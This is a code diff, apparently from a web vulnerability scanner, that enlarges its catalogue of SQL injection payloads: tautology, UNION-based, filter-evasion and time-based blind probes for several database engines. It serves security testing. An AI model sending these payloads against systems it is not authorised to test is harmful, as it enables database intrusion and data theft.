@@ -113,12 +113,21 @@ function mkFinding(f) {
 
 // ───────────────────────── payload catalogues ─────────────────────────
 
-const SQLI_PAYLOADS = [`'`, `"`, `' OR '1'='1`, `1)) OR 1=1--`, `' AND SLEEP(0)--`, `';SELECT pg_sleep(0)--`];
+const SQLI_PAYLOADS = [
+  `'`, `"`, `\``, `\\`, `%27`, `%2527`,
+  `' OR '1'='1`, `" OR "1"="1`, `1)) OR 1=1--`, `') OR ('1'='1`,
+  `' OR 1=1-- -`, `admin'--`, `admin'/*`, `' UNION SELECT NULL--`,
+  `' UNION SELECT NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL--`,
+  `' AND SLEEP(0)--`, `';SELECT pg_sleep(0)--`,
+  `'/**/OR/**/1=1--`, `'%09OR%091=1--`, `'||'a'='a`,
+];
 const SQLI_TIME_PAYLOADS = [
   { p: `';SELECT pg_sleep(5)--`, engine: "postgres" },
   { p: `' OR SLEEP(5)-- -`, engine: "mysql" },
   { p: `';WAITFOR DELAY '0:0:5'--`, engine: "mssql" },
   { p: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--`, engine: "oracle" },
+  { p: `'||pg_sleep(5)||'`, engine: "postgres" },
+  { p: `'/**/AND/**/SLEEP(5)#`, engine: "mysql" },
 ];
 const SQLI_BOOL_PAIRS = [
   { t: `' AND '1'='1`, f: `' AND '1'='2` },
